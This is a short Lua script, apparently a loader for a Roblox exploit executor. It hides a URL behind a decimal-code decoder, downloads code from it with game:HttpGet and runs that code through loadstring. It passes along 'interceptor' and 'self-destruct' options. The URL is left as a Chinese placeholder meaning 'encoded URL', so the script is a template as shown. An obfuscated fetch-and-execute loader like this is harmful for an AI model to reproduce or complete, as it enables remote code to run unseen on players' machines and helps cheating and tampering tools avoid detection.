local gistConfig = ... or {}

local INTERCEPTOR_MODE = gistConfig.INTERCEPTOR_MODE or 0
local targetPath = gistConfig.targetPath
local timeout = gistConfig.timeout or 2000
local selfDestruct = gistConfig.selfDestruct or false

local function d(s)
    local r = ""
    for n in s:gmatch("%d+") do
        r = r .. string.char(tonumber(n))
    end
    return r
end

local success, gistSource = pcall(function()
    return game:HttpGet(d("编码后的URL"))
end)

if success and gistSource then
    local fn = loadstring(gistSource)

    if fn then
        pcall(fn, {
            INTERCEPTOR_MODE = INTERCEPTOR_MODE,
            targetPath = targetPath,
            timeout = timeout,
            selfDestruct = selfDestruct
        })
    end
end
